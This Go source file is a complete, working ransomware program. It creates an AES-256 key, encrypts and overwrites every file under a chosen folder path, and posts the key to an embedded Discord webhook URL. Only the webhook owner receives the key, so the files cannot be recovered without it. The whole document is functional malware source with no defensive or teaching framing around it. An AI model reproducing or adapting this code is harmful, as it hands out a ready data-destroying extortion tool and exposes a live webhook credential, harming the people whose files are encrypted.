package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
)

// Generate a new AES encryption key
func generateKey() ([]byte, error) {
	key := make([]byte, 32) // AES-256 key (32 bytes)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}
	return key, nil
}

// Encrypt the given data using AES-GCM
func encryptData(data []byte, key []byte) ([]byte, error) {
	// Create a new AES cipher block
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Create a new GCM (Galois/Counter Mode) cipher for AES
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Create a nonce (number used once) for encryption
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}

	// Encrypt the data
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

// Encrypt files in the given folder and its subfolders
func encryptFilesInFolder(folderPath string, key []byte) error {
	err := filepath.Walk(folderPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Println("Error reading file:", err)
			return err
		}

		// Skip directories
		if info.IsDir() {
			return nil
		}

		// Read file content
		data, err := ioutil.ReadFile(path)
		if err != nil {
			log.Println("Error reading file:", err)
			return err
		}

		// Encrypt the file content
		encryptedData, err := encryptData(data, key)
		if err != nil {
			log.Println("Error encrypting file:", err)
			return err
		}

		// Save the encrypted content back to the file
		err = ioutil.WriteFile(path, encryptedData, info.Mode())
		if err != nil {
			log.Println("Error writing encrypted file:", err)
			return err
		}

		log.Println("Encrypted file:", path)
		return nil
	})

	return err
}

// Send the encryption key to Discord via webhook
func sendKeyToDiscord(key []byte, discordWebhookURL string) error {
	// Convert the encryption key to a hexadecimal string
	keyHex := hex.EncodeToString(key)

	// Create the message payload for the Discord webhook
	payload := fmt.Sprintf(`{"content": "Encryption Key: %s"}`, keyHex)

	// Send the request to Discord webhook
	resp, err := http.Post(discordWebhookURL, "application/json", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Failed to send message to Discord, status: %s", resp.Status)
	}

	log.Println("Encryption key sent to Discord.")
	return nil
}

func main() {
	// Folder to encrypt
	folderPath := `C:\Users\hugo\Desktop\test\test.txt` // Change to your folder path

	// Your Discord webhook URL
	discordWebhookURL := "https://discord.com/api/webhooks/1295679771983872000/BG5rg1ZTH7EWxZGzo3uKYAzzeeWBHQlGDvQXbCfYfLZCJBx1KGy0pPL6q3WiFPXsCSGk" // Replace with your webhook URL

	// Generate a new AES key
	key, err := generateKey()
	if err != nil {
		log.Fatalf("Error generating key: %v", err)
	}

	// Encrypt all files in the folder
	err = encryptFilesInFolder(folderPath, key)
	if err != nil {
		log.Fatalf("Error encrypting files: %v", err)
	}

	// Send the encryption key to Discord
	err = sendKeyToDiscord(key, discordWebhookURL)
	if err != nil {
		log.Fatalf("Error sending key to Discord: %v", err)
	}

	log.Println("Encryption process completed.")
}
